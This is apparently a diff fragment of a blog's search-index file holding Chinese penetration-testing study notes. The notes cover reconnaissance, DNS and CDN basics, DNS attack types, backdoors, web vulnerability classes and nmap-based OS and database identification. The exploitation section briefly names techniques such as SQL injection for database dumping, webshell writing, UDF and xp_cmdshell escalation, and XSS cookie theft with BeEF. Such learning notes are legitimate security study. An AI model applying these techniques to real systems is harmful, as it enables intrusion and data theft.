+<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>正向记录(mx,ns,txt,spf,cname)</p>
+<p>反向查询(whois信息反查:电话、邮箱、姓名)</p>
+<p>备案信息</p>
+<h3 id="3-漏洞发现"><a href="#3-漏洞发现" class="headerlink" title="3.漏洞发现"></a>3.漏洞发现</h3><p>传统漏洞</p>
+<p>框架组件公开漏洞</p>
+<p>口令漏洞</p>
+<p>代码审计0day</p>
+<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
+<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>知识基础</title>
+    <url>/2023/05/13/%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-域名"><a href="#1-域名" class="headerlink" title="1.域名"></a>1.域名</h2><p>internet上某台计算机或机组的名称</p>
+<h3 id="二级域名、多级域名"><a href="#二级域名、多级域名" class="headerlink" title="二级域名、多级域名"></a>二级域名、多级域名</h3><p>国际顶级域名下的二级域名：.microsoft.com</p>
+<p>国家顶级域名下的二级域名：.com.cn</p>
+<h2 id="2-DNS"><a href="#2-DNS" class="headerlink" title="2.DNS"></a>2.DNS</h2><p>域名系统（Domain Name System）：域名和IP地址相互映射的一个分布式数据库，使用UDP端口53，对每一级域名长度限制是63个字符，域名总长度不超过253个字符</p>
+<p>当我们向DNS服务器发起解析域名的请求时，DNS服务器首先会查询自己的缓存中有没有该域名，如果缓存中存在该域名，则可以直接返回IP地址。如果缓存中没有，服务器则会以递归的方式层层访问。</p>
+<p>例如：我们要访问<a href="http://www.baidu/">www.baidu</a>. com，首先我们会先向全球13个根服务器发起请求，询问com域名的地址，然后再向负责com域名的名称服务器发送请求，找到baidu.com，这样层层递归，最终找到我们需要的IP地址。</p>
+<h3 id="本地HOSTS与DNS关系"><a href="#本地HOSTS与DNS关系" class="headerlink" title="本地HOSTS与DNS关系"></a>本地HOSTS与DNS关系</h3><p>Hosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。<br>Hosts地址：C:\Windows\System32\drivers\etc\hosts </p>
+<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
+<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h3 id="CDN是什么"><a href="#CDN是什么" class="headerlink" title="CDN是什么"></a>CDN是什么</h3><p>Content Delivery Network：构建在网络数据上的分布式内容分发网络，提高系统响应速度，也可以一定程度地拦截攻击。</p>
+<p>举例来说，某网站的服务器在A地，E地的用户想要获取服务器的数据，需要跨越很长的距离。这时候的传输速度和路由转发因素，导致访问速度缓慢，所以，如果在E地建立一个CDN服务器，其上缓存了A地服务器的一些数据，那这样的话用户只需访问E地的CDN服务器就能获取相关信息。</p>
+<h3 id="CDN工作过程"><a href="#CDN工作过程" class="headerlink" title="CDN工作过程"></a>CDN工作过程</h3><ol>
+<li><p>dns请求当地local DNS</p>
+</li>
+<li><p>当地local DNS递归的查询服务器的gslb（全局负载均衡；CDN系统总是希望用距离用户最近的设备为其提供服务，这也需要在不同地域部署多个节点。GSLB系统就是解决这个问题的。</p>
+<p>版权声明：本文为CSDN博主「dahuang1016」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/dahuang1016/article/details/105928932%EF%BC%89">https://blog.csdn.net/dahuang1016/article/details/105928932）</a></p>
+</li>
+<li><p>服务器根据local DNS 分配最佳节点，返回ip</p>
+</li>
+<li><p>用户获得最佳接入ip，访问最佳节点。</p>
+</li>
+<li><p>如果该节点没有用户想要获取的内容，则通过内部路由访问上一节点，直到找到文件或到达源站为止。</p>
+</li>
+<li><p>cdn节点缓存该数据，下次请求该文件时可以直接返回。</p>
+</li>
+</ol>
+<p>————————————————<br>版权声明：本文为CSDN博主「码上腾飞」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Frankltf/article/details/108820315">https://blog.csdn.net/Frankltf/article/details/108820315</a></p>
+<h3 id="CDN与DNS关系"><a href="#CDN与DNS关系" class="headerlink" title="CDN与DNS关系"></a>CDN与DNS关系</h3><p>cdn的就近访问，那就需要知道用户所在位置，好给他分配最优的CDN节点。**&#x3D;&#x3D;所以需要用到DNS定位&#x3D;&#x3D;<strong>。一般的调度方式是，如果调度服务器看到用户使用了E地的LDNS（本地DNS）服务器，</strong>就会认为该用户来自E地**，然后给该用户分配了E地的CDN服务器，让他去访问。</p>
+<p>当然了，其缺点在于，A地的用户使用了E地的LDNS的话，被分配的会是E地的CDN。</p>
+<p>所以引入了<strong>http调度</strong>。</p>
+<p>其原理为：当用户访问我们的服务器时，服务器先分析用户的ip地址，然后服务器给用户返回一个302重定向，将离用户最近的服务器存在location中，用户再去请求这个cdn服务器就能得到最佳的cdn节点。</p>
+<p>不足之处在于，其有一次额外的htttp访问，首次访问的延时较高，访问些小文件有点得不偿失。<strong>所以一般是dns先定位，http的方式来调整偏差。</strong></p>
+<h3 id="常见DNS攻击"><a href="#常见DNS攻击" class="headerlink" title="常见DNS攻击"></a>常见DNS攻击</h3><ul>
+<li>缓存投毒：它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。</li>
+<li>DNS劫持：是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。（针对面较广）</li>
+<li>域名劫持：域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。（针对面窄一点）</li>
+<li>DNS DDOS攻击：通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。</li>
+</ul>
+<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
+<h2 id="3-后门"><a href="#3-后门" class="headerlink" title="3.后门"></a>3.后门</h2><h3 id="后门是什么"><a href="#后门是什么" class="headerlink" title="后门是什么"></a>后门是什么</h3><p>通常指那些绕过安全性控制而获取对程序或系统访问权的程序方法。<br>在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。</p>
+<h3 id="后门的意义"><a href="#后门的意义" class="headerlink" title="后门的意义"></a>后门的意义</h3><p>可以更方便的链接到主机；在获取到主机权限的时候，后门可以充当命令控制台的角色 </p>
+<p>如果后门进入后遇到文件无权限，换目录</p>
+<h2 id="4-WEB"><a href="#4-WEB" class="headerlink" title="4.WEB"></a>4.WEB</h2><h3 id="WEB的组成"><a href="#WEB的组成" class="headerlink" title="WEB的组成"></a>WEB的组成</h3><ul>
+<li>网站源码：分脚本类型，分应用方向</li>
+<li>操作系统：windows、linux</li>
+<li>中间件（搭建平台）：apache iis tomcat nginx 等</li>
+<li>数据库：access mysql mssql oracle sybase db2 postsql 等</li>
+</ul>
+<h3 id="WEB相关漏洞"><a href="#WEB相关漏洞" class="headerlink" title="WEB相关漏洞"></a>WEB相关漏洞</h3><ul>
+<li>WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</li>
+<li>WEB 中间件对应漏洞：未授权访问，变量覆盖…</li>
+<li>WEB 数据库对应漏洞：弱口令，权限提升…</li>
+<li>WEB 系统层对应漏洞：提权，远程代码执行</li>
+<li>其他第三方对应漏洞</li>
+<li>APP 或 PC 应用结合类</li>
+</ul>
+<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
+<h3 id="信息敏感点"><a href="#信息敏感点" class="headerlink" title="信息敏感点"></a>信息敏感点</h3><ul>
+<li><p>敏感目录结构：数据库配置文件，后台目录，模版目录，数据库目录等</p>
+</li>
+<li><p>web脚本类型：ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码</p>
+</li>
+<li><p>应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
+</li>
+<li><p>开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</p>
+</li>
+</ul>
+<h3 id="网站搭建相关知识"><a href="#网站搭建相关知识" class="headerlink" title="网站搭建相关知识"></a>网站搭建相关知识</h3><p>扫描时：域名访问一般只会指向某个目录(子目录)及其内部文件，而IP访问指向根目录，发现的内容更多。</p>
+<p>f12网络数据包会有网站的信息（如中间站、系统等）</p>
+<h3 id="常见文件后缀解析"><a href="#常见文件后缀解析" class="headerlink" title="常见文件后缀解析"></a>常见文件后缀解析</h3><p>主要是类似于一句话木马的后缀限制，如果不行，就换个后缀，这个原理来自中间件的解析？</p>
+<h2 id="5-系统"><a href="#5-系统" class="headerlink" title="5.系统"></a>5.系统</h2><h3 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h3><p>windows对大小写不敏感，ping值 ttl128左右；而linux敏感，ping值 ttl64左右</p>
+<p>nmap -O ip</p>
+<h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><h4 id="识别方式"><a href="#识别方式" class="headerlink" title="识别方式"></a>识别方式</h4><ul>
+<li>nmap -O ip</li>
+<li>nmap ip -p 端口，通过端口开发反推数据库</li>
+</ul>
+<h4 id="数据库常见漏洞类型与攻击"><a href="#数据库常见漏洞类型与攻击" class="headerlink" title="数据库常见漏洞类型与攻击"></a>数据库常见漏洞类型与攻击</h4><ul>
+<li>弱口令</li>
+<li>sql注入</li>
+</ul>
+<h3 id="常见数据库结构"><a href="#常见数据库结构" class="headerlink" title="常见数据库结构"></a>常见数据库结构</h3><ul>
+<li>ASP+Access</li>
+<li>php+mysql</li>
+<li>axpx+mssql</li>
+<li>jsp+mssql，oracle</li>
+<li>python+mongodb</li>
+</ul>
+<h3 id="服务器端口"><a href="#服务器端口" class="headerlink" title="服务器端口"></a>服务器端口</h3><ul>
+<li>关系型数据库 –MySQL:3306 –SqlServer:1433 –Oracle:1521</li>
+<li>NOSQL数据库 –MongoDB:27017 –Redis:6379 -memcached:11211</li>
+</ul>
+]]></content>
+      <categories>
+        <category>网安</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
       </tags>
   </entry>
   <entry>
